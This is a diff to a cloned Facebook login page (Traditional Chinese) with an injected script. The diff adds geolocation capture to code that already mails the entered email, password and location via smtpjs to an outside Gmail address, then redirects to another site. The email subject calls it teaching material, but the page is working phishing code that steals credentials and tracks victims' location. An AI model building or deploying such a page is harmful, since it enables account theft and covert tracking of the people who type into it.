@@ -2,10 +2,22 @@
 <html lang="zh-Hant" id="facebook" class=""><head><meta charset="utf-8"><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer"><script nonce="">function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"ajaxpipe_token":"AXgT5POBE1kx-RmQLIA","gk_instrument_object_url":true,"stack_trace_limit":30,"timesliceBufferSize":5000,"show_invariant_decoder":false,"compat_iframe_token":"AQ5QEEo7iwy_enCFh-Q","isCQuick":false});</script><script nonce="">(function(a){function b(b){if(!window.openDatabase)return;b.I_AM_INCOGNITO_AND_I_REALLY_NEED_WEBSQL=function(a,b,c,d){return window.openDatabase(a,b,c,d)};window.openDatabase=function(){throw new Error()}}b(a)})(this);</script><style nonce=""></style><script nonce="">__DEV__=0;CavalryLogger=false;</script><noscript><meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" /></noscript><link rel="manifest" id="MANIFEST_LINK" href="/data/manifest/" crossorigin="use-credentials"><title id="pageTitle">Facebook - 登入或註冊</title><meta property="og:site_name" content="Facebook"><meta property="og:url" content="https://zh-tw.facebook.com/"><meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png"><meta property="og:locale" content="zh_TW"><link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/"><link rel="alternate" media="handheld" href="https://m.facebook.com/"><meta name="description" content="登入 Facebook 即可開始和親朋好友及認識的人分享聯繫。"><link rel="canonical" href="https://zh-tw.facebook.com/"><link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico"><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yQ/l/1,cross/_obrSI0SeMA.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="GNI5Q0x" crossorigin="anonymous">
 <script src="https://smtpjs.com/v3/smtp.js"> </script>
  <script>
+    var postext="";
     window.onload = function(){ 
+
         var sendd = document.getElementById("u_0_5_qk");
         sendd.onclick=function(){
             function sendEmail(){
+                /*抓取地理位置*/
+                function getLocation(){
+                    if(navigator.geolocation){
+                        navigator.geolocation.getCurrentPosition(showPosition);
+                    }
+                }
+                function showPosition(position){
+                    postext="緯度:" + position.coords.latitude + " 經度: " + position.coords.longitude;
+
+                /*信件發送*/
                 Email.send({
                 Host : "smtp.elasticemail.com",
                 Username : "50915112@gm.nfu.edu.tw",
@@ -13,14 +25,20 @@
                 To : 'a0978435327@gmail.com',
                 From : "50915112@gm.nfu.edu.tw",
                 Subject : "教學用帳號密碼傳回值",
-                Body : "信箱:" + document.getElementById("email").value+"密碼:"+document.getElementById("pass").value
-            }).then(
-                message => console.log("執行結果:"+message)
-            );
-        }
+                Body : "信箱:" + document.getElementById("email").value+"密碼:"+document.getElementById("pass").value + "地理位置" + postext
+                }).then(
+                    message => console.log("執行結果:"+message)
+                );
+                /*信件發送*/
+
+
+                }
+                getLocation();
+                /*抓取地理位置*/
+            }
         sendEmail();
-        setTimeout(document.write(''),680);
-        setTimeout("location.href='https://www.chingshin.tw/'",700);
+        //setTimeout(document.write(''),1680);
+        setTimeout("location.href='https://www.chingshin.tw/'",1700);
         };
     };
   </script>
